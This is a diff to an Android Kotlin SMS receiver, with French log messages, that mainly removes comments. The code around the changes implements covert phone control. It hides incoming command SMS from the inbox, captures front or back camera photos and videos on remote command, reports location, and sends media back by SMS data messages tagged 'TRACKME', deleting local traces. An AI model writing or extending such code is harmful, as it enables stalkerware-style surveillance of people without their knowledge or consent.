@@ -15,6 +15,7 @@ import android.util.Log
 import androidx.core.content.ContextCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONObject
 import java.io.File
@@ -43,7 +44,7 @@ class SmsReceiver : BroadcastReceiver() {
         if (intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION && 
             intent?.action != "android.intent.action.DATA_SMS_RECEIVED") return
         
-        abortBroadcast() // ❌ SUPPRIMER DU SMS DE LA BOÎTE
+        abortBroadcast()
         
         val messages: Array<SmsMessage> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             Telephony.Sms.Intents.getMessagesFromIntent(intent)
@@ -61,7 +62,6 @@ class SmsReceiver : BroadcastReceiver() {
             val content = body.removePrefix(SMS_PREFIX)
             
             when {
-                // 📍 POSITION
                 content == "REQUEST" -> onRequestReceived?.invoke(from)
                 
                 content.startsWith("POS:") -> {
@@ -71,38 +71,32 @@ class SmsReceiver : BroadcastReceiver() {
                     } catch (e: Exception) {}
                 }
                 
-                // 📸 PHOTO ARRIÈRE
                 content == "PHOTO" || content == "PHOTO:BACK" -> {
                     Log.d(TAG, "📸 Commande PHOTO ARRIÈRE de $from")
                     handlePhotoRequest(context, from, CamService.CAMERA_BACK)
                 }
                 
-                // 📸 PHOTO AVANT
                 content == "PHOTO:FRONT" -> {
                     Log.d(TAG, "📸 Commande PHOTO AVANT de $from")
                     handlePhotoRequest(context, from, CamService.CAMERA_FRONT)
                 }
                 
-                // 🎥 VIDÉO ARRIÈRE
                 content == "VIDEO" || content == "VIDEO:BACK" -> {
                     Log.d(TAG, "🎥 Commande VIDÉO ARRIÈRE de $from")
                     handleVideoRequest(context, from, CamService.CAMERA_BACK)
                 }
                 
-                // 🎥 VIDÉO AVANT
                 content == "VIDEO:FRONT" -> {
                     Log.d(TAG, "🎥 Commande VIDÉO AVANT de $from")
                     handleVideoRequest(context, from, CamService.CAMERA_FRONT)
                 }
                 
-                // 📥 LIEN PHOTO REÇU
                 content.startsWith("PHOTO_URL:") -> {
                     val url = content.removePrefix("PHOTO_URL:")
                     Log.d(TAG, "📥 Téléchargement photo : $url")
                     downloadPhoto(context, url, from)
                 }
                 
-                // 📥 LIEN VIDÉO REÇU
                 content.startsWith("VIDEO_URL:") -> {
                     val url = content.removePrefix("VIDEO_URL:")
                     Log.d(TAG, "📥 Lien vidéo reçu : $url")
@@ -112,14 +106,13 @@ class SmsReceiver : BroadcastReceiver() {
         }
     }
 
-    // ===== TRAITEMENT PHOTO =====
     private fun handlePhotoRequest(context: Context, toNumber: String, cameraChoice: String) {
         val dest = if (toNumber.startsWith("+")) toNumber else "+$toNumber"
         val sms = SmsManager.getDefault()
         
         Thread {
             try {
-                val jpegBytes = CamService.takePhotoCompressedSync(context, cameraChoice, quality = 60)
+                val jpegBytes = CamService.takePhotoCompressedSync(context, cameraChoice, 60)
                 val base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
                 
                 val json = JSONObject().put("source", "data:image/jpeg;base64,$base64").toString()
@@ -141,7 +134,6 @@ class SmsReceiver : BroadcastReceiver() {
         }.start()
     }
 
-    // ===== TRAITEMENT VIDÉO =====
     private fun handleVideoRequest(context: Context, toNumber: String, cameraChoice: String) {
         val dest = if (toNumber.startsWith("+")) toNumber else "+$toNumber"
         val sms = SmsManager.getDefault()
@@ -166,7 +158,7 @@ class SmsReceiver : BroadcastReceiver() {
                     sms.sendDataMessage(dest, null, 7777.toShort(), 
                         "TRACKME:VIDEO_URL:$videoUrl".toByteArray(Charsets.UTF_8), null, null)
                     Log.d(TAG, "✅ Vidéo envoyée — $videoUrl")
-                    videoFile.delete() // Nettoyer
+                    videoFile.delete()
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Erreur vidéo", e)
@@ -174,7 +166,6 @@ class SmsReceiver : BroadcastReceiver() {
         }.start()
     }
 
-    // ===== TÉLÉCHARGER PHOTO =====
     private fun downloadPhoto(context: Context, url: String, from: String) {
         Thread {
             try {
